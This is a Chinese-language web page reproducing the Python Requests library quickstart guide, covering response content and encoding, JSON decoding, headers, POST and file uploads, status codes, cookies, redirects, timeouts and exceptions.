-<h2 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h2><p>我们能读取服务器响应的内容。再次以 GitHub 时间线为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests  </span><br><span class="line">&gt;&gt;&gt; r = requests.get(&apos;https://github.com/timeline.json&apos;)  </span><br><span class="line">&gt;&gt;&gt; r.text  </span><br><span class="line">u&apos;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</span><br></pre></td></tr></table></figure></p>
-<p>Requests 会自动解码来自服务器的内容。大多数 unicode 字符集都能被无缝地解码。<br>请求发出后，Requests 会基于 HTTP 头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests 会使用其推测的文本编码。你可以找出 Requests 使用了什么编码，并且能够使用 r.encoding 属性来改变它：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.encoding  </span><br><span class="line">  &apos;utf-8&apos;  </span><br><span class="line">&gt;&gt;&gt; r.encoding = &apos;ISO-8859-1&apos;</span><br></pre></td></tr></table></figure></p>
-<p>如果你改变了编码，每当你访问 r.text ，Request 都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding为相应的编码。这样就能使用正确的编码解析 r.text 了。<br>在你需要的情况下，Requests 也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由 Requests 来为你处理编码。<br>二进制响应内容<br>你也能以字节的方式访问请求响应体，对于非文本请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.content  </span><br><span class="line">b&apos;[&#123;&quot;repository&quot;:&#123;&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/...</span><br></pre></td></tr></table></figure></p>
-<p>Requests 会自动为你解码 gzip 和 deflate 传输编码的响应数据。<br>例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from PIL import Image  </span><br><span class="line">&gt;&gt;&gt; from io import BytesIO</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; i = Image.open(BytesIO(r.content))</span><br></pre></td></tr></table></figure></p>
-<h2 id="JSON-响应内容"><a href="#JSON-响应内容" class="headerlink" title="JSON 响应内容"></a>JSON 响应内容</h2><p>Requests 中也有一个内置的 JSON 解码器，助你处理 JSON 数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.get(&apos;https://github.com/timeline.json&apos;)  </span><br><span class="line">&gt;&gt;&gt; r.json()  </span><br><span class="line">[&#123;u&apos;repository&apos;: &#123;u&apos;open_issues&apos;: 0, u&apos;url&apos;: &apos;https://github.com/...</span><br></pre></td></tr></table></figure></p>
-<p>如果 JSON 解码失败， r.json() 就会抛出一个异常。<br>例如，响应内容是 401 (Unauthorized)，尝试访问 r.json() 将会抛出 ValueError: No JSON object could be decoded 异常。<br>需要注意的是，成功调用 r.json() 并不意味着响应的成功。有的服务器会在失败的响应中包含一个 JSON 对象（比如 HTTP 500 的错误细节）。这种 JSON 会被解码返回。要检查请求是否成功，请使用 r.raise_for_status() 或者检查 r.status_code 是否和你的期望相同。<br>原始响应内容<br>在罕见的情况下，你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True。具体你可以这么做：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.get(&apos;https://github.com/timeline.json&apos;, stream=True)  </span><br><span class="line">&gt;&gt;&gt; r.raw  </span><br><span class="line">&lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;  </span><br><span class="line">&gt;&gt;&gt; r.raw.read(10)  </span><br><span class="line">&apos;\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03&apos;</span><br></pre></td></tr></table></figure></p>
-<p>但一般情况下，你应该以下面的模式将文本流保存到文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(filename, &apos;wb&apos;) as fd:  </span><br><span class="line">    for chunk in r.iter_content(chunk_size):  </span><br><span class="line">        fd.write(chunk)</span><br></pre></td></tr></table></figure></p>
-<p>使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是优先推荐的获取内容方式。 Note that chunk_size can be freely adjusted to a number that may better fit your use cases.</p>
-<h2 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h2><p>如果你想为请求添加 HTTP 头部，只要简单地传递一个 dict 给 headers 参数就可以了。<br>例如，在前一个示例中我们没有指定 content-type:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url = &apos;https://api.github.com/some/endpoint&apos;</span><br><span class="line">&gt;&gt;&gt; headers = &#123;&apos;user-agent&apos;: &apos;my-app/0.0.1&apos;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure></p>
-<p>注意: 定制 header 的优先级低于某些特定的信息源，例如：<br>如果在 .netrc 中设置了用户认证信息，使用 headers= 设置的授权就不会生效。而如果设置了 auth= 参数，<code>.netrc</code> 的设置就无效了。<br>如果被重定向到别的主机，授权 header 就会被删除。<br>代理授权 header 会被 URL 中提供的代理身份覆盖掉。<br>在我们能判断内容长度的情况下，header 的 Content-Length 会被改写。<br>更进一步讲，Requests 不会基于定制 header 的具体情况改变自己的行为。只不过在最后的请求中，所有的 header 信息都会被传递进去。<br>注意: 所有的 header 值必须是 string、bytestring 或者 unicode。尽管传递 unicode header 也是允许的，但不建议这样做。<br>更加复杂的 POST 请求<br>通常，你想要发送一些编码为表单形式的数据——非常像一个 HTML 表单。要实现这个，只需简单地传递一个字典给 data 参数。你的数据字典在发出请求时会自动编码为表单形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload = &#123;&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: &apos;value2&apos;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.post(&quot;http://httpbin.org/post&quot;, data=payload)</span><br><span class="line">&gt;&gt;&gt; print(r.text)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;key2&quot;: &quot;value2&quot;,</span><br><span class="line">    &quot;key1&quot;: &quot;value1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>你还可以为 data 参数传入一个元组列表。在表单中多个元素使用同一 key 的时候，这种方式尤其有效：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload = ((&apos;key1&apos;, &apos;value1&apos;), (&apos;key1&apos;, &apos;value2&apos;))</span><br><span class="line">&gt;&gt;&gt; r = requests.post(&apos;http://httpbin.org/post&apos;, data=payload)</span><br><span class="line">&gt;&gt;&gt; print(r.text)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;form&quot;: &#123;</span><br><span class="line">    &quot;key1&quot;: [</span><br><span class="line">      &quot;value1&quot;,</span><br><span class="line">      &quot;value2&quot;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict，那么数据会被直接发布出去。<br>例如，Github API v3 接受编码为 JSON 的 POST/PATCH 数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import json</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; url = &apos;https://api.github.com/some/endpoint&apos;</span><br><span class="line">&gt;&gt;&gt; payload = &#123;&apos;some&apos;: &apos;data&apos;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload))</span><br><span class="line"></span><br><span class="line">此处除了可以自行对 dict 进行编码，你还可以使用 json 参数直接传递，然后它就会被自动编码。这是 2.4.2 版的新加功能：</span><br><span class="line">&gt;&gt;&gt; url = &apos;https://api.github.com/some/endpoint&apos;</span><br><span class="line">&gt;&gt;&gt; payload = &#123;&apos;some&apos;: &apos;data&apos;&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.post(url, json=payload)</span><br><span class="line"></span><br><span class="line">POST一个多部分编码(Multipart-Encoded)的文件</span><br><span class="line">Requests 使得上传多部分编码文件变得很简单：</span><br><span class="line">&gt;&gt;&gt; url = &apos;http://httpbin.org/post&apos;</span><br><span class="line">&gt;&gt;&gt; files = &#123;&apos;file&apos;: open(&apos;report.xls&apos;, &apos;rb&apos;)&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.post(url, files=files)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;files&quot;: &#123;</span><br><span class="line">    &quot;file&quot;: &quot;&lt;censored...binary...data&gt;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>你可以显式地设置文件名，文件类型和请求头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url = &apos;http://httpbin.org/post&apos;</span><br><span class="line">&gt;&gt;&gt; files = &#123;&apos;file&apos;: (&apos;report.xls&apos;, open(&apos;report.xls&apos;, &apos;rb&apos;), &apos;application/vnd.ms-excel&apos;, &#123;&apos;Expires&apos;: &apos;0&apos;&#125;)&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.post(url, files=files)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;files&quot;: &#123;</span><br><span class="line">    &quot;file&quot;: &quot;&lt;censored...binary...data&gt;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果你想，你也可以发送作为文件来接收的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url = &apos;http://httpbin.org/post&apos;</span><br><span class="line">&gt;&gt;&gt; files = &#123;&apos;file&apos;: (&apos;report.csv&apos;, &apos;some,data,to,send\nanother,row,to,send\n&apos;)&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.post(url, files=files)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  &quot;files&quot;: &#123;</span><br><span class="line">    &quot;file&quot;: &quot;some,data,to,send\\nanother,row,to,send\\n&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望将请求做成数据流。默认下 requests 不支持, 但有个第三方包 requests-toolbelt 是支持的。你可以阅读 toolbelt 文档 来了解使用方法。<br>在一个请求中发送多文件参考 高级用法 一节。<br>警告<br>我们强烈建议你用二进制模式(binary mode)打开文件。这是因为 Requests 可能会试图为你提供 Content-Length header，在它这样做的时候，这个值会被设为文件的字节数（bytes）。如果用文本模式(text mode)打开文件，就可能会发生错误。</p>
-<h2 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h2><p>我们可以检测响应状态码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.get(&apos;http://httpbin.org/get&apos;)</span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span class="line">200</span><br></pre></td></tr></table></figure></p>
-<p>为方便引用，Requests还附带了一个内置的状态码查询对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.status_code == requests.codes.ok</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
-<p>如果发送了一个错误请求(一个 4XX 客户端错误，或者 5XX 服务器错误响应)，我们可以通过 Response.raise_for_status() 来抛出异常：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bad_r = requests.get(&apos;http://httpbin.org/status/404&apos;)</span><br><span class="line">&gt;&gt;&gt; bad_r.status_code</span><br><span class="line">404</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; bad_r.raise_for_status()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;requests/models.py&quot;, line 832, in raise_for_status</span><br><span class="line">    raise http_error</span><br><span class="line">requests.exceptions.HTTPError: 404 Client Error</span><br></pre></td></tr></table></figure></p>
-<p>但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.raise_for_status()</span><br><span class="line">None</span><br></pre></td></tr></table></figure></p>
-<p>一切都挺和谐哈。</p>
-<h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><p>我们可以查看以一个 Python 字典形式展示的服务器响应头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.headers</span><br><span class="line">&#123;</span><br><span class="line">    &apos;content-encoding&apos;: &apos;gzip&apos;,</span><br><span class="line">    &apos;transfer-encoding&apos;: &apos;chunked&apos;,</span><br><span class="line">    &apos;connection&apos;: &apos;close&apos;,</span><br><span class="line">    &apos;server&apos;: &apos;nginx/1.0.4&apos;,</span><br><span class="line">    &apos;x-runtime&apos;: &apos;148ms&apos;,</span><br><span class="line">    &apos;etag&apos;: &apos;&quot;e1ca502697e5c9317743dc078f67693f&quot;&apos;,</span><br><span class="line">    &apos;content-type&apos;: &apos;application/json&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>但是这个字典比较特殊：它是仅为 HTTP 头部而生的。根据 RFC 2616， HTTP 头部是大小写不敏感的。<br>因此，我们可以使用任意大写形式来访问这些响应头字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r.headers[&apos;Content-Type&apos;]</span><br><span class="line">&apos;application/json&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.headers.get(&apos;content-type&apos;)</span><br><span class="line">&apos;application/json&apos;</span><br></pre></td></tr></table></figure></p>
-<p>它还有一个特殊点，那就是服务器可以多次接受同一 header，每次都使用不同的值。但 Requests 会将它们合并，这样它们就可以用一个映射来表示出来，参见 RFC 7230:<br>A recipient MAY combine multiple header fields with the same field name into one “field-name: field-value” pair, without changing the semantics of the message, by appending each subsequent field value to the combined field value in order, separated by a comma.<br>接收者可以合并多个相同名称的 header 栏位，把它们合为一个 “field-name: field-value” 配对，将每个后续的栏位值依次追加到合并的栏位值中，用逗号隔开即可，这样做不会改变信息的语义。</p>
-<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>如果某个响应中包含一些 cookie，你可以快速访问它们：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url = &apos;http://example.com/some/cookie/setting/url&apos;</span><br><span class="line">&gt;&gt;&gt; r = requests.get(url)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.cookies[&apos;example_cookie_name&apos;]</span><br><span class="line">&apos;example_cookie_value&apos;</span><br></pre></td></tr></table></figure></p>
-<p>要想发送你的cookies到服务器，可以使用 cookies 参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; url = &apos;http://httpbin.org/cookies&apos;</span><br><span class="line">&gt;&gt;&gt; cookies = dict(cookies_are=&apos;working&apos;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.get(url, cookies=cookies)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&apos;&#123;&quot;cookies&quot;: &#123;&quot;cookies_are&quot;: &quot;working&quot;&#125;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<p>Cookie 的返回对象为 RequestsCookieJar，它的行为和字典类似，但界面更为完整，适合跨域名跨路径使用。你还可以把 Cookie Jar 传到 Requests 中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; jar = requests.cookies.RequestsCookieJar()</span><br><span class="line">&gt;&gt;&gt; jar.set(&apos;tasty_cookie&apos;, &apos;yum&apos;, domain=&apos;httpbin.org&apos;, path=&apos;/cookies&apos;)</span><br><span class="line">&gt;&gt;&gt; jar.set(&apos;gross_cookie&apos;, &apos;blech&apos;, domain=&apos;httpbin.org&apos;, path=&apos;/elsewhere&apos;)</span><br><span class="line">&gt;&gt;&gt; url = &apos;http://httpbin.org/cookies&apos;</span><br><span class="line">&gt;&gt;&gt; r = requests.get(url, cookies=jar)</span><br><span class="line">&gt;&gt;&gt; r.text</span><br><span class="line">&apos;&#123;&quot;cookies&quot;: &#123;&quot;tasty_cookie&quot;: &quot;yum&quot;&#125;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<h2 id="重定向与请求历史"><a href="#重定向与请求历史" class="headerlink" title="重定向与请求历史"></a>重定向与请求历史</h2><p>默认情况下，除了 HEAD, Requests 会自动处理所有重定向。<br>可以使用响应对象的 history 方法来追踪重定向。<br>Response.history 是一个 Response 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。<br>例如，Github 将所有的 HTTP 请求重定向到 HTTPS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.get(&apos;http://github.com&apos;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.url</span><br><span class="line">&apos;https://github.com/&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span class="line">200</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.history</span><br><span class="line">[&lt;Response [301]&gt;]</span><br></pre></td></tr></table></figure></p>
-<p>如果你使用的是GET、OPTIONS、POST、PUT、PATCH 或者 DELETE，那么你可以通过 allow_redirects 参数禁用重定向处理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.get(&apos;http://github.com&apos;, allow_redirects=False)</span><br><span class="line">&gt;&gt;&gt; r.status_code</span><br><span class="line">301</span><br><span class="line">&gt;&gt;&gt; r.history</span><br><span class="line">[]</span><br></pre></td></tr></table></figure></p>
-<p>如果你使用了 HEAD，你也可以启用重定向：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.head(&apos;http://github.com&apos;, allow_redirects=True)</span><br><span class="line">&gt;&gt;&gt; r.url</span><br><span class="line">&apos;https://github.com/&apos;</span><br><span class="line">&gt;&gt;&gt; r.history</span><br><span class="line">[&lt;Response [301]&gt;]</span><br></pre></td></tr></table></figure></p>
-<h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><p>你可以告诉 requests 在经过以 timeout 参数设定的秒数时间之后停止等待响应。基本上所有的生产代码都应该使用这一参数。如果不使用，你的程序可能会永远失去响应：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; requests.get(&apos;http://github.com&apos;, timeout=0.001)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=&apos;github.com&apos;, port=80): Request timed out. (timeout=0.001)</span><br></pre></td></tr></table></figure></p>
-<p>注意<br>timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out.</p>
-<h2 id="错误与异常"><a href="#错误与异常" class="headerlink" title="错误与异常"></a>错误与异常</h2><p>遇到网络问题（如：DNS 查询失败、拒绝连接等）时，Requests 会抛出一个 ConnectionError 异常。<br>如果 HTTP 请求返回了不成功的状态码， Response.raise_for_status() 会抛出一个 HTTPError 异常。<br>若请求超时，则抛出一个 Timeout 异常。<br>若请求超过了设定的最大重定向次数，则会抛出一个 TooManyRedirects 异常。<br>所有Requests显式抛出的异常都继承自 requests.exceptions.RequestException 。</p>
 
       
       
